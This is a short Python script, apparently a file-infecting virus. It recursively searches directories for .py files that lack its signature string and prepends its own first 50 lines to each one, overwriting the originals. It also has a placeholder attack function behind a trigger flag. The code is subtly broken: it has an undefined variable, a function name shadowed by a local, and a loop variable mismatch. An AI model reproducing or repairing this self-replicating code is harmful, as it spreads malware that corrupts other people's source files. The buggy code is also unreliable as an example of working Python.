#!/usr/bin/env python3

import os

SIGNATURE = "GPJPVIRUSMATURANTU"
VERSION = "1.0"
LINES = 50
fileType = ".py"
trigger = False

def browse(path):
    filesToInfect = []
    browse = os.listdir(path)
    for fileName in browseDir:
        if os.path.isdir(path +"/" + fileName):
            filesToInfect.extend(browse(path + "/" + fileName))
        elif fileName[-3:] == fileType:
            isInfected = False
            for line in open(path + "/" + fileName):
                if SIGNATURE in line: 
                    isInfected = True
                    break
            if isInfected == False:
                filesToInfect.append(path + "/" + fileName)
    
    return filesToInfect

def infiltrate(filesToInfect):
    content = ""
    me = open(os.path.abspath(__file__))
    for i,list in enumerate(me):
        if i < LINES:
            content = content + line 
    me.close()

    for file in filesToInfect:
        f = open(file)
        fileContent = f.read()
        f.close()

        f = open(file, "w")
        f.write(content + fileContent)
        f.close()

def attack():
    if trigger:
        pass

infiltrate(browse(os.path.abspath("")))
attack()
